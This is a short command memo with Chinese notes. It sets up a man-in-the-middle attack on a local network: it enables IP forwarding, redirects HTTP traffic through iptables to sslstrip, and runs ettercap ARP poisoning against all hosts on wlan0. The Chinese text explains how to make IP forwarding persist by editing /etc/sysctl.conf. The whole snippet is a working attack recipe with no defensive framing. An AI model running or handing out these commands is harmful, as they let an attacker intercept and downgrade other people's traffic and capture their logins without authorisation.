echo "1">/proc/sys/net/ipv4/ip_forward

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

sslstrip -l 10000

ettercap -T -q -i wlan0 -M arp:remote // //

要永久开启路由功能就得调整内核参数了，也挺简单，
vim /etc/sysctl.conf
找到如下这一行，将前面的#号删除即可，有的是把‘=0’改成‘=1’
net.ipv4.ip_forward=1

再执行，sysctl -p来使内核参数即时生效。
